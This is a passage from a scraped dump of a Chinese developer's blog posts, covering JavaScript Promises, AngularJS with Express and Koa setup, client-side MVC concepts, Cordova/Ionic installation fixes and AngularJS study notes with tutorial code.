timerPromisefy(128)]).then(function(values)&#123; console.log(Date.now() - startDate + 'ms'); // 129ms，约128ms console.log(values); // [1,32,64,128]&#125;) 结果表示，确实只用了128ms左右，表示所有的promise对象是同时执行的不是顺序执行，因为若顺序执行则需要1 + 32 +64 +128 = 225ms左右的时间。 Promise.race()和Promise.all一样，接收一个promise对象数组为参数。 Promise.all 在接收到的所有的对象promise都变为 FulFilled 或者 Rejected 状态之后才会继续进行后面的处理，而Promise.race 只要有一个promise对象进入 FulFilled 或者 Rejected 状态的话，就会继续进行后面的处理。123456789101112131415161718192021222324// delay 毫秒后执行resolvefunction timerPromisefy(delay)&#123; return new Promise(function(resolve)&#123; setTimeout(function()&#123; console.log('delay:',delay); resolve(delay); &#125;,delay); &#125;);&#125;// 任何promise变为resolve后程序退出Promise.race([ timerPromisefy(1), timerPromisefy(32), timerPromisefy(64), timerPromisefy(128)]).then(function(values)&#123; console.log(values); // 1&#125;);// 输出// delay: 1// 1// delay: 32// delay: 64// delay: 128 在第一个promise对象确定后，注册在then中的函数就调用返回了，结果就是then输出1，但是后面的promise对象依然会执行。 then 、 catch许多建议中，将catch和then分开使用进行错误错误，那么在 .then 里同时指定处理对错误进行处理的函数相比，和使用 catch 有什么差别么？123456789101112131415161718192021222324252627282930function throwError(value) &#123; // 抛出异常 throw new Error(value);&#125;// &lt;1&gt; onRejected不会被调用function badMain(onRejected) &#123; return Promise.resolve(42).then(throwError, onRejected);&#125;// &lt;2&gt; 之前的promise有异常发生时onRejected会被调用function badMain2(onRejected) &#123; return Promise.resolve(42).then(throwError).then(throwError, onRejected);&#125;// &lt;3&gt; 有异常发生时onRejected会被调用function goodMain(onRejected) &#123; return Promise.resolve(42).then(throwError).catch(onRejected);&#125;// 运行示例badMain(function()&#123; console.log(\"BAD\");&#125;);goodMain(function()&#123; console.log(\"GOOD\");&#125;);badMain2(function()&#123; console.log(\"BAD2\");&#125;);// 输出：// GOOD// BAD2// Promise对象，Uncaught (in promise) Error: 42 上述代码中，badMain中，onRejected函数并不能捕捉throwError抛出的错误，所以得出结论：then中的onRejected只能不错前面的promise对象的错误 总结 使用promise.then(onFulfilled, onRejected)时，在onFulfilled中发生的异常，在onRjected中无法捕捉 在promise.then(onFulfilled).catch(onRejected)的情况下，then中产生的异常能在catch捕获 then和catch本质没有区别，catch是then(undefined, onRejected)的一个语法糖，但是需要分场合使用","categories":[{"name":"promise","slug":"promise","permalink":"https://github.com/xmoyKING/categories/promise/"}],"tags":[{"name":"promise","slug":"promise","permalink":"https://github.com/xmoyKING/tags/promise/"}]},{"title":"Promise1-相关知识点","slug":"promise","date":"2017-04-08T08:36:18.000Z","updated":"2017-12-06T14:50:09.399Z","comments":true,"path":"2017/04/08/promise/","link":"","permalink":"https://github.com/xmoyKING/2017/04/08/promise/","excerpt":"","text":"记录学习Promise的过程，以及查到的一些资料和博客，知识点，主要参考：JavaScript Promise迷你书（中文版） PDF: Promises迷你书电子版（中文版） Github: Promises迷你书电子版（中文版） 一个简单的Promise示例：12345678910var promise = new Promise(function(resolve)&#123; resolve(42);&#125;);promise.then(function(value)&#123; console.log(value);&#125;).catch(function(error)&#123; console.log(error);&#125;)// 结果为正常输出 42 new Promise(fn)返回一个promise对象，在fn中指定异步处理流程，若正常则调用resolve(result)将处理的值result返回，若错误则调用reject(error)将error对象返回（其中可以包含错误的信息） 普通的异步的回调函数1234567getAsync('file.json', function(error, result)&#123; if(error)&#123; // 出错时处理 throw error; &#125; // 成功时处理 ... JSON.parse(result); &#125;) 在Nodejs中，规定JS回调函数的第一个参数为Error对象，但这仅仅是约定，不采用也不会出问题。 而Promise则规范了异步处理，采用统一规则，其他的写法会出错，比如必须使用then和catch作为成功与失败的接口：123456var promise = getAsyncPromise('file.json');promise.then(function(result)&#123; // 成功时的处理&#125;).catch(function(error)&#123; // 失败时的处理&#125;) Promise简介ES6 Promises标准中定义三种类型的promise： Constructor, 可以使用new Promise()实例化一个promise对象 12345var promise = new Promise(function(resolve, reject)&#123; // 处理 // 处理完成，使用resolve或reject&#125;); Instance Method, 通过new生成的promise对象，可以调用promise.then()方法， 1promise.then(onFulfilled, onRejected) 当成功时，即resolve时，onFulfilled会被调用，当失败时，即reject时，onRejected会被调用。 promise.then在成功和失败时都可以调用，若只想对异常进行处理，则可以采用promise.then(undefined, onRejected),即只指定reject时的回调函数，也可以使用promise.catch(onRejected)。 Static Method， Promise类的静态方法，比如Promise.all(),Promise.resolve()等，是一些对Promise辅助的方法。 Promise流程先看一个Promise示例：12345678910111213141516171819202122function asyncFunction()&#123; // step1 return new Promise(function(resolve, reject)&#123; setTimeout(function()&#123; resolve('Async Hello world'); &#125;, 16); &#125;);&#125;// step2asyncFunction().then(function(value)&#123; console.log(value); // 'Async Hello world'&#125;).catch(function(error)&#123; console.log(error);&#125;);// 下面的代码的作用与step2中一样asyncFunction().then(function(value)&#123; console.log(value); // 'Async Hello world'&#125;, function(error)&#123; console.log(error);&#125;); step1: 在asyncFunction函数内部，使用new Promise()实例化一个promise对象，然后返回。 step2：设置asyncFunction函数返回的promise对象，比如then和catch，该promise对象，会在16ms时被resolve，此时，then的回调函数会被调用，并输出结果&#39;Async Hello world&#39;。 上面的情况中，catch的回调函数不会执行，因为promise返回的是resolve，但若没有setTimeout的话，则会产生异常，此时catch中的回调就会执行。 Promise状态任何一个Promise的实例对象都有三种状态（按照ES6 Promise规范和Promises/A+规范描述的术语）： “has-resolution” - Fulfilled，表示成功，即resolve时调用onFulfilled回调函数 “has-rejection” - Rejected， 表示失败，即reject时调用onRejected回调 “unresolved” - Pending， 表示等待，即不是resolve，也不是reject的状态，是Promise对象创建后的初始化状态。 以上的三种状态，从Pending转换为Fulfilled或Rejected之后，promise对象的状态就不会变化了（即认为Fulfilled和Rejected是Settled不变的）。 初次使用Promise比如用Promise处理XHR(XMLHttpRequest)数据，封装一个getURL函数，返回一个封装了XHR的Promise对象。12345678910111213141516171819202122232425262728293031323334353637function getURL(url)&#123; return new Promise(function(resolve, reject)&#123; var req = new XMLHttpRequest(); req.open('GET', url, true); req.onload = function()&#123; if(req.status === 200)&#123; //只有在状态为200时，即成功时返回数据 resolve(req.responseText); &#125;else&#123; reject(new Error(req.statusText)); &#125; &#125;; req.onerror = function()&#123; reject(new Error(req.statusText)); &#125;; req.send(); &#125;);&#125;// 测试执行var url = 'http://httpbin.org/get'; //getURL(url).then(function onFulfilled(value)&#123; console.log(value);&#125;).catch(function onRejected(error)&#123; console.error(error);&#125;);// 返回一个json对象，包含了请求的主机的一些信息。比如：// &#123; \"args\": &#123;&#125;, \"headers\": &#123; \"Accept\": \"*/*\", \"Accept-Encoding\": \"gzip, deflate, sdch\", \"Accept-Language\": \"en-US,en;q=0.8\", \"Connection\": \"close\", \"Host\": \"httpbin.org\", \"Origin\": \"http://liubin.org\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36\" &#125;, \"origin\": \"211.86.158.159\", \"url\": \"http://httpbin.org/get\" &#125;var URL = \"http://httpbin.org/status/500\"; // 服务器返回状态码为500，发生错误getURL(URL).then(function onFulfilled(value)&#123; console.log(value);&#125;).catch(function onRejected(error)&#123; console.error(error);&#125;);// Error: INTERNAL SERVER ERROR","categories":[{"name":"promise","slug":"promise","permalink":"https://github.com/xmoyKING/categories/promise/"}],"tags":[{"name":"promise","slug":"promise","permalink":"https://github.com/xmoyKING/tags/promise/"}]},{"title":"angularjs入门笔记-4-angularjs1,express4,","slug":"angularjs4","date":"2017-04-06T13:53:19.000Z","updated":"2017-04-18T13:53:19.000Z","comments":true,"path":"2017/04/06/angularjs4/","link":"","permalink":"https://github.com/xmoyKING/2017/04/06/angularjs4/","excerpt":"","text":"各种ng的依赖让人绝望，实在无法让人安心开发，折腾了好久， 还有bower的依赖问题也是很麻烦，下载需要很久。 参考资料快速搭建Web环境 Angularjs + Express3 + Bootstrap3 使用express init命令创建一个项目，然后将目录结构改为如下： 其中需要用到bower，同时需要使用bower安装angular，angular-route，bootstrap，angular-bootstrapbower.json中具体依赖如下，此文件可使用bower init命令生成，然后手动添加依赖即可1234567891011121314151617181920212223&#123; \"name\": \"ng1-express4\", \"description\": \"\", \"main\": \"\", \"authors\": [ \"xmoyking &lt;xmoyking@gmail.com&gt;\" ], \"license\": \"MIT\", \"homepage\": \"\", \"ignore\": [ \"**/.*\", \"node_modules\", \"bower_components\", \"test\", \"tests\" ], \"dependencies\": &#123; \"angular\": \"1.6.4\", \"angular-route\": \"1.6.4\", \"bootstrap\": \"^3.3.7\", \"angular-bootstrap\": \"^2.5.0\" &#125;&#125; 然后使用bower install命令安装依赖的库（需要一段时间，个人感觉挺长的） 将根目录下的app.js修改：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849var express = require('express');var path = require('path');var favicon = require('serve-favicon');var logger = require('morgan');var cookieParser = require('cookie-parser');var bodyParser = require('body-parser');var ejs = require('ejs');var app = express();// view engine setupapp.set('views', path.join(__dirname, 'views'));app.engine('.html', ejs.__express);// app.set('view engine', 'ejs'); app.set('view engine', 'html'); // 将ejs替换为html// uncomment after placing your favicon in /public//app.use(favicon(path.join(__dirname, 'public', 'favicon.ico')));app.use(logger('dev'));app.use(bodyParser.json());app.use(bodyParser.urlencoded(&#123; extended: false &#125;));app.use(cookieParser());app.use(express.static(path.join(__dirname, 'app'))); //将静态目录设置为app目录，元public目录没有使用// catch 404 and forward to error handlerapp.use(function(req, res, next) &#123; var err = new Error('Not Found'); err.status = 404; next(err);&#125;);// error handlerapp.use(function(err, req, res, next) &#123; // set locals, only providing error in development res.locals.message = err.message; res.locals.error = req.app.get('env') === 'development' ? err : &#123;&#125;; // render the error page res.status(err.status || 500); res.render('error');&#125;);// angular启动页app.get('/', function (req, res) &#123; res.sendfile('app/index.html');&#125;);module.exports = app; 主要是做修改view engine和express静态目录两个中间件，其他的大部分的代码保持原样即可，不需要修改太多 然后将app/angular/app.js写如下代码：1234567891011121314151617'use strict';var app=angular.module('app', ['ngRoute']);app.config(['$routeProvider', '$locationProvider', function($routeProvider, $locationProvider)&#123; $routeProvider.when('/',&#123; templateUrl: '/views/tpl/welcome.html', // controller: 'welcomeCtrl' // 注释这句，否则会报错，具体原因不明 &#125;).otherwise(&#123; redirectTo: '/' &#125;); $locationProvider.html5Mode(&#123; enable: true, requireBase: false &#125;);&#125;]); 浏览器报如下错误，表示没有用到controller12Error: [$controller:ctrlreg] // 删除routeProvider中的controller解决报错，但是却没有加载controller app/angular/controller.js代码 ：12345'use strict';function welcomeCtrl($scope) &#123; $scope.username = 'king';&#125; app/index.html代码如下：12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt; &lt;head&gt; &lt;title&gt;&lt;/title&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt; &lt;link rel=\"stylesheet\" href=\"bower_components/bootstrap/dist/css/bootstrap.min.css\"&gt; &lt;link href=\"css/style.css\" rel=\"stylesheet\"&gt; &lt;script src=\"bower_components/angular/angular.min.js\"&gt;&lt;/script&gt; &lt;script src=\"bower_components/jquery/dist/jquery.min.js\"&gt;&lt;/script&gt; &lt;script src=\"bower_components/bootstrap/dist/js/bootstrap.min.js\"&gt;&lt;/script&gt; &lt;script src=\"bower_components/angular-route/angular-route.min.js\"&gt;&lt;/script&gt; &lt;script src=\"bower_components/angular-bootstrap/ui-bootstrap-tpls.min.js\"&gt;&lt;/script&gt; &lt;script src=\"js/angular/controller.js\"&gt;&lt;/script&gt; &lt;script src=\"js/angular/app.js\"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body ng-app=\"app\"&gt; &lt;div class=\"row\"&gt; &lt;div class=\"col-lg-12\"&gt; &lt;div ng-view&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 主要是添加各种js和依赖文件 app/views/tpl/welcome.html代码如下：12345678&lt;form class=\"form-inline\" role=\"form\"&gt; &lt;div class=\"form-group\"&gt; &lt;label for=\"\"&gt;username:&lt;/label&gt; &lt;input type=\"text\" class=\"form-control\" ng-model=\"username\"&gt; &lt;/div&gt;&lt;/form&gt;&lt;p&gt;welcome &#123;&#123;username&#125;&#125;&lt;/p&gt; 最后执行npm start即可在浏览器的localhost:3000打开这个demo应用了 关于angularjs1，jquery和bootstrap，个人感觉实在太笨重，本例仅仅作为入门折腾使用，开发环境还是不要使用这套搭配来的好。","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"},{"name":"express4","slug":"express4","permalink":"https://github.com/xmoyKING/tags/express4/"}]},{"title":"angularjs入门笔记-3-小试牛刀 ES6,angularjs,NodeJs,KOA","slug":"angularjs3","date":"2017-04-05T09:28:19.000Z","updated":"2017-12-06T14:50:08.899Z","comments":true,"path":"2017/04/05/angularjs3/","link":"","permalink":"https://github.com/xmoyKING/2017/04/05/angularjs3/","excerpt":"","text":"angularjs1的一个练习项目，全栈实战，涉及到ES6,angularjs1,NodeJs,KOA前端代码中，ng能让我们减少大量的重复劳动，比如绑定两个输入框，使用原生JS angularjs是一个框架，不是库，库是为了方便程序员，基本不会限制程序员，如jQuery，做一个轮播的插件，可以写出非常非常多的方式实现，非常灵活，但是无法完成大型项目，而框架限制了程序员按照约定的方式编写程序，能让完成大型项目，因为有相同规约。 来源自：全栈 ES6、AngularJS、NodeJS与KOA实战 angularjs123456789101112&lt;script&gt; window.onload = function()&#123; var oT1 = document.getElementById('t1'); var oT2 = document.getElementById('t2'); oT1.oninput = function()&#123; oT2.value = oT1.value; &#125;&#125;;&lt;/script&gt; &lt;input type=\"text\" id=\"t1\"/&gt;&lt;input type=\"text\" id=\"t2\"/&gt; HTML5新属性 oninput 能监听输入框的输入事件 ng-init 完成变量初始化，使用逗号或分号定义多个变量 依赖注入的原理：根据函数，根据函数声明中的参数的名称查找$scope内的相应对象12345678910111213141516171819var $scope=&#123;a: 12, b: 5, c: 99, qq: 55, i: 99&#125;;//由函数定义决定参数——餐馆function showCtrl(c, i, qq)&#123; alert(arguments.length); console.log(arguments);&#125;//1.知道show要了什么var str=showCtrl.toString();str=str.split('&#123;')[0].match(/\\(.*\\)/)[0].replace(/\\s+/g, '');str=str.substring(1, str.length-1);var arr=str.split(',');//2.给它相应的东西var args=[];for(var i=0;i&lt;arr.length;i++)&#123; args[i]=$scope[arr[i]];&#125;showCtrl.apply(null, args); ES6ES6 to ES5 转换库 traceur.js (google出品) 块级作用域，解构赋值 map / reduce 的思想： 云计算中的 “打散” / “汇总” generator： 分步执行，与异步相配合,function后有一个*号，而且return语句无用，同时自带了一些方法123456789function* show()&#123; yield 1; yield 5;&#125;var gen = show(); // 此时并不是真的执行show，而是创建了gen对象console.log(gen.next()); // value: 12, done: falseconsole.log(gen.next()); // value: 5, done: falseconsole.log(gen.next()); // value: undefined, done: false koakoa重度依赖ES6，性能比Express好， npm install koa koa-static 新建server.js 12345678910111213141516171819202122232425const koa = require('koa');const static = require('koa-static'); // 返回静态文件的插件const server = new koa();server.use(static('./www/')); //若能在www目录找到则返回静态文件，否则使用后面的server.use(function* (next)&#123; console.log(this.req.url); //获取请求路径 // this.response.attachment('./file.txt'); //将文件作为附件发送出去 this.body = 'abc'; yield next;&#125;);server.use(function* ()&#123; this.body += 'd'; // this.throw(404, 'not founded ~'); //特地throw一个错误&#125;);server.on('error',function(err)&#123; // 出错时，捕获错误 console.error('error', err);&#125;)server.listen(8080); // 直接打开浏览器localhost:8080 输出 abcd 打开浏览器，若输入localhost:8080/* 能在www目录找到则返回静态文件，否则使用后面的,而其他目录输出abcd.","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"},{"name":"ES6","slug":"ES6","permalink":"https://github.com/xmoyKING/tags/ES6/"},{"name":"NodeJs","slug":"NodeJs","permalink":"https://github.com/xmoyKING/tags/NodeJs/"},{"name":"KOA","slug":"KOA","permalink":"https://github.com/xmoyKING/tags/KOA/"}]},{"title":"angularjs入门笔记-2-理解AngularJS的优势","slug":"angularjs2","date":"2017-04-03T07:56:41.000Z","updated":"2017-04-03T07:56:41.000Z","comments":true,"path":"2017/04/03/angularjs2/","link":"","permalink":"https://github.com/xmoyKING/2017/04/03/angularjs2/","excerpt":"","text":"AngularJS并不能解决所有问题，了解并正确使用NG非常关键，在HTML文档每次加载的时候，NG会有许多工作要做，比如编译HTML元素，计算数据绑定，执行指令等。 同时优化的目标就是尽可能加大执行效率，这需要仔细考虑Web应用的类型，广义的Web类型分为回合式（传统的）和单页面。 回合式&amp;单页面所谓回合式，其实就是指传统的Web应用，由浏览器向服务器请求一个初始的HTML文档，用户交互（单击按钮、链接、提交表单）会触发事件，浏览器向服务器发送请求并收到服务器响应的一个新的HTML文档。 本质上，这类应用将浏览器作为HTML的解析器，所有的应用业务逻辑和数据都在服务器上，浏览器发出的其实是一系列无状态的HTTP请求，服务器处理这些请求并动态生成HTML。 这种方式对浏览器的要求比较小，能够最大限度支持客户端，但是也有缺点，即用户在浏览器加载完新HTML文档之前必须等待。 而当下多数使用Ajax的web应用，只是改变了一部分数据交互的方式，提高了带宽利用率，但是本质上还是回合制的，即跳转链接，请求新的HTML文档。 而单页面则不同，只在初始的HTML文档发给浏览器，而用户交互所需要的数据都是通过ajax获取，虽然数据还是存放在服务器端，但是不存在浏览器对整个HTML文档的重复的完整解析过程，即初始的HTML文档不会被再次加载或替换，仅仅只需要浏览器解析一些HTML片段。 而项目越复杂，单页面应用的优势越明显，Angularjs则以单页面应用和复杂的回合式应用见长，angularjs作为一个框架，将复杂的逻辑和表现交互分离解耦，各行其职，而对于单元测试不那么重要而且需要立即得到结果的底复杂度Web用于适用于jquery，简而言之对于简单的项目，一般时候jquery即可。 客户端MVC模式MVC最早是在70年代用于GUI应用程序的，而近年来，MVC模块被越来越多的用在了客户端开发中，用于降低Web开发的复杂性。 使用MVC模式的关键前提在于如何实现关注点分离，即应用程序中的数据模型与业务和展示逻辑解耦，在Web客户端开发中，这意味着将数据、操作数据的逻辑和显示数据的HTML元素相分离，结果就是得到一个更易开发、维护和测试的客户端应用。 MVC模式在服务器端的实现 MVC模式的AngularJS实现 从以上两个图片对比，可以看出，传统服务器的实现是从数据库中获取模型（数据），应用对来自浏览器的HTTP请求提供服务，也是回合式Web应用的基础。 而在AngularJS的实现中，客户端从服务器端获取数据，通常通过RESTful风格（一种请求的接口风格）的Web服务获取数据，在客户端实现中，控制器和视图的目标是对模型中的数据进行操作，从而执行对Dom的操作，创建或管理可与用户交互的HTML元素，这些交互也会被映射到控制器，这就构建了一个应用交互的闭环。 在客户端使用AngularJS这样的MVC框架，并不会与服务器端使用的MVC框架冲突，相反会分担一部分服务器端的复杂度，因为它将服务器端的一些工作转移到了客户端，使服务器能提供对更多客户端的支持。 理解模型MVC中的M即模型，包含了用户操作和可见的数据，有两种广义的模型，视图模型，表示从控制器传到视图的数据；业务模型，包含业务领域的数据，以及在创建、存储、操作这些数据的操作，通常为模型逻辑。 什么是“业务”呢？比如一个进销系统，业务领域就包括与进货销售相关的流程、业务模型就包括账目数据以及创建、存储、管理这些数据的逻辑。又比如一个视频网站，业务领域就是视频数据，以及对这些视频创建、存储和操作的逻辑。 简而言之，模型应该： 包含业务数据 包含创建、管理和修改这些数据的逻辑（通过Web服务执行远程逻辑） 提供整洁API，合理暴露模型数据以及对应的操作 不应该： 暴露模型数据是如何获取或管理的细节（如数据在硬盘上的存储机制） 包含用户交互以及对模型进行转换修改的逻辑（这是控制器的职责） 包含将数据显示给用户的逻辑（这是视图的职责） 最好的业务模型应该包含获取和存储持久化数据的逻辑，包括CRUD操作。 理解控制器控制器是数据模型和视图之间的渠道，控制器向作用域中添加业务逻辑（行为），而作用域是模型的子集。 控制器应该： 包含初始化作用所需的逻辑 包含视图所需的用于表示作用域中的数据的逻辑行为 包含更具用户交互来更新作用域所需的逻辑行为 不应该： 包含操作DOM的逻辑（这是视图的职责） 包含管理数据持久化的逻辑（这是模型的职责） 在作用域之外操作数据 理解视图数据控制器可以创建视图数据，用于简化视图的定义。视图数据不会被持久化，要么仅仅只是存在用户某次交互中，要么就是综合业务模型数据的某几部分而成，比如通过ng-model获取的input元素中的用户输入值。 视图数据是通过控制器作用域来创建和访问的。 理解视图AngularJS视图是通过HTML元素来定义的，而这些元素是通过使用数据绑定或者指令来进行增强或者生成的。AngularJS指令是这样视图变得非常灵活，也是HTML变为动态Web应用的基础。 视图应该： 包含将数据呈现给用户所需的逻辑和标记不应该： 包含复杂逻辑（一般复杂逻辑放在控制器中，复杂与否可自行判断） 包含创建、存储或操作业务模型的逻辑 视图可以包含逻辑、但是应该尽量简单。若不加节制的视图中处理逻辑，会让整个应用变得难以测试和维护，推荐仅添加简单方法或表达式到视图中。 理解RESTful怎样用通俗的语言解释REST，以及RESTful？ 那些HTTP方法具有无为性？由于HTTP的特性，GET方法是具有无为性的，即对于该方法的响应应该只读取数据而不修改它，而浏览器重复发出GET请求而不会修改服务器端的状态。 什么是幂等，及幂等的HTTP方法？即对于PUT和DELETE方法，多次发送同一个请求应该和只发送一次该请求具有相同的效果，例如删除一个用户的请求，第一次响应删除，但是后续请求就不用做任何事情。而POST方法既不是具有无为性也不是幂等的。 常见问题这里的问题常常不是代码编写的问题，而是设计的问题 逻辑位置错误最常见的错误，将逻辑位置放错，破坏了MVC关注点的分离 将业务逻辑放到视图，而不是控制器中 将领域逻辑放到控制器，而不是模型中 在使用RESTful的服务时将数据存储逻辑放到客户端模型中以上问题都是设计问题，而且需要过一段时间才会暴露出来，应用程序仍然能运行，但会变得难以维护和优化。第三种问题只有当存储被更换时才会出现。 将逻辑放到正确的位置需要经验，但使用单元测试将更早的找到问题，因为覆盖该逻辑所需要的测试是与MVC模式相对应的，若无法相容则说明设计逻辑有问题。 设计逻辑规则： 视图逻辑应该仅仅为显示准备数据，且永远不要修改模型 控制器逻辑永远不应该直接创建、更新或删除模型中的数据 客户端永远不应该直接访问数据存储","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"}]},{"title":"cordova / ionic 安装配置出错解决办法集合","slug":"cordova-install","date":"2017-04-02T03:17:52.000Z","updated":"2017-04-02T03:17:52.000Z","comments":true,"path":"2017/04/02/cordova-install/","link":"","permalink":"https://github.com/xmoyKING/2017/04/02/cordova-install/","excerpt":"","text":"此文中主要是对cordova的环境配置中遇到的坑进行记录。 cordova需要node， npm，若是安卓平台： android sdk、 jdk 使用官方教程，安装cordova后用cordova create hello me.king.hello helloword创建一个行项目。 第一个hello为项目名,也是目录名，me.king.hello为包名，最后的helloworld为app的名字 然后在项目中执行cordova platform add android --save添加android平台 然后对www文件夾下的js，css，html文件进行修改 cordova 安装过程中，发现在windows10下使用vscode的集成命令行工具中执行cordova run andriod就会报错12Error: Failed to find 'ANDROID_HOME' environment variable. Try setting setting it manually.Failed to find 'android' command in your 'PATH'. Try update your 'PATH' to include path to valid SDK directory. 可以用windows自带的cmd执行命令，查看是否是sdk的问题，之外就是sdk环境变量配置确实有错误， andriod SDK环境变量配置没问题，然后用cmd执行cordova run andriod命令之后 若发现报错：Error: Could not find gradle wrapper within Android SDK. Might need to update your Android SDK.则可以选择使用下载官方的sdk tools压缩文件，覆盖原sdk目录下的tools文件夹即可。参考如下链接：cordova gradle wrapper问题 此时会下载大量的文件，耐心等待即可 然后继续运行cordova run andriod，若报没有模拟器，可以在命令后添加选项--device用已经开启debug模式连接到电脑上的真机运行。 其中，使用虚拟机调试前需要新建一个android虚拟设备，才能调试 最后就是虚拟设备能卡死人~ 建议使用真机。 ionicionic 的安装过程中，按照官方流程 npm install -g cordova ionic ionic start --v2 myApp tabs cd myApp ionic serve 在ionic serve输入后，一般第一次会让你选择使用什么地址进行访问，这时可以选择localhost， 然后就会在默认浏览器的界面中弹出一个8100端口的地址，然后就可以愉快玩耍了 但是若想要通过ip访问，需要加上ionic serve --address 某地址 或者直接使用--all 或 -a 选项表示允许所有地址进行访问，然后用ip:port的方式访问即可。 可以使用ionic --help来查看其他命令 使用cordova的添加平台命令添加android环境cordova platform add android 打包为apk可以使用ionic build android然后根据输出找到对应的apk即可 可以参考如下链接：angular.js和ionic框架搭建一个webApp（适合对angular有基础）","categories":[{"name":"mixed","slug":"mixed","permalink":"https://github.com/xmoyKING/categories/mixed/"}],"tags":[{"name":"cordova","slug":"cordova","permalink":"https://github.com/xmoyKING/tags/cordova/"},{"name":"ionic","slug":"ionic","permalink":"https://github.com/xmoyKING/tags/ionic/"}]},{"title":"angularjs入门笔记-1-知识点","slug":"angularjs1","date":"2017-04-02T01:13:07.000Z","updated":"2017-12-06T14:50:08.836Z","comments":true,"path":"2017/04/02/angularjs1/","link":"","permalink":"https://github.com/xmoyKING/2017/04/02/angularjs1/","excerpt":"","text":"本文将持续更新angularjs相关的知识点或文字，作为入门笔记的总汇。 真正的ng专家不仅仅是指对诸多技巧了然于胸，能够自如运用到项目中——只要熟悉就够了。真正的专家需要从大处着手，挖掘这门技术背后隐含的设计思想和哲学，即：需知其所以然，又不偏废细节，锱铢必较每个变量函数的命名格式。使代码臻于完美，并从中提炼出能够推而广之的最佳实践。 MMVM模式的要点是：以领域Model为中心，遵循“分离关注点”设计原则，这是ng的模型驱动思维与jq的DOM驱动思维的显著差异，所以做ng开发时切忌： 绝不先设计页面，然后用DOM操作改变它 指令不是封装jq代码的“天堂” 关于1.x / 2.x / 3.x / 4.x等ng的版本的问题？到底该如何选择？后续的2,3,4与1.x是不兼容的，语法改变了，甚至部分底层实现完全改变，1.x后的版本使用TypeScript和ES6作为主体语言，同时也抛弃了IE，除了IE11部分支持。若不确定是否一定能抛弃IE浏览器之前，可以先学习1.x, 同时实际使用中大部分还是1.x， 而1.x也依然会继续维护，所以学习后续版本之前学习1.x是可以的，因为即使语法不同，实现不同，但是编程模型没有太大差异，都是基于MVVM模型，有双向绑定，有相同的设计哲学——利用高内聚的小模块组合最终的程序。 AngularJS知识库一个以ng为中心的知识点集合 跟我学AngularJs:Directive指令用法解读（上） 博客内还有下篇链接 AngularJS中的Provider们：Service和Factory等的区别 AngularJS权威教程 刷第一遍, 翻译的不好，不通顺，而且小错误也挺多从第8章开始遇到的一些不太清楚的指令或函数： $injector AngularJS API之$injector —- 依赖注入 （三）ng-app的使用困惑和angularJS框架的自动加载关于ng-app的加载问题，后面还有4，5，6第7个中的声明依赖的方式没看懂 $rootScope (九)通过几段代码，理清angularJS中的$injector、$rootScope和$scope的概念和关联关系系列博客，博客中对angular，做了类比java web中的一些概念 (十一)通过angularjs的ng-repeat指令看scope的继承关系关于js中的引用和基本传值的问题：1234567891011121314151617var obj = &#123;\"name\":\"aty\"&#125;; wrongChangeName(obj); alert(obj.name);//仍然是aty rightChangeName(obj); alert(obj.name);//hehe function rightChangeName(obj) &#123; obj.name=\"hehe\"; &#125; function wrongChangeName(obj) &#123; obj = &#123;\"name\":\"hehe\"&#125;; &#125; 在其他作用域下修改一个对象，应该通过属性的方式修改而不是使用新的对象字面量覆盖 $apply$scope.$digest() (十五)在controller之外修改$scope中的数据，双向绑定特性失效，不能自动刷新手动触发digest循环检测脏值 (十八)angularjs中模块bootstrap后,动态注册新的controller18，19都没懂 Think in AngularJS：对比jQuery和AngularJS的不同思维模式 compilelinkpostLinkangularjs指令中的compile与link函数详解 configrun AngularJS模块详解涉及ng的内部实现原理，没懂 $watch$apply 理解$watch ，$apply 和 $digest — 理解数据绑定过程很清晰很好懂，例子也很适合 $evalAsync$applyAsync [AngularJS面面观] 5. scope中的两个异步方法 - $applyAsync以及$evalAsync源码分析，没懂 [译]AngularJS $apply, $digest, 和$evalAsync的比较 $parse 浅谈AngularJS的$parse服务 这篇可以让你看明白 $cacheFactory AngularJs $cacheFactory 缓存服务 $q angularjs系列之轻松使用$q进行异步编程在没有promise的基础上不是很懂，应该需要先对promise有一定基础才行 promise JavaScript Promise迷你书（中文版） $resource angular $resource模块 Restangular github: mgonto/restangular 基于ng，rest风格，promise返回结果，文档全英文，有机会翻译一波 withCredentials 有关于跨域问题的request头，具体设置根据库或使用场景不同 X-Request-With AngularJS与服务器交互 这篇文章只是涉及到一点X-Request-With $render$setViewValue 浅谈Angular中ngModel的$render XSFR令牌 12章之前的一些章节看的不是很明白，有很多超前的知识点或没有解释清楚的概念 18,19章没有看,后面的章节在特定情况下还是很有价值的，但是目前初学ng的情况下没有必要深入。 AngularJS深度剖析与最佳实践ngRoute一般用法：1234$routeProvider.when('/url',&#123; templateUrl: 'path/to/template.html', controller: 'SomeCtrl',&#125;); 工作原理：监听$locationChangeSuccess事件，每次URL（包括hash部分）发生变化时触发，更新$routeProvider/$stateProvider中注册的路由表中的URL部分。 总是用ng-model作为输出在写指令时，有三种方式可以输出操作结果： 写回调函数，当有需要输出的内容时调用，并传入结果 传入哈希对象，然后对它的属性赋值 依赖ngModel指令，并传入值 以分页控件为例，回调函数的方式最直接，缺点是使用不方便，必须在控制器中写一个回调函数来接收结果，并赋值给一个内部变量。 哈希对象的方式，&lt;pagination 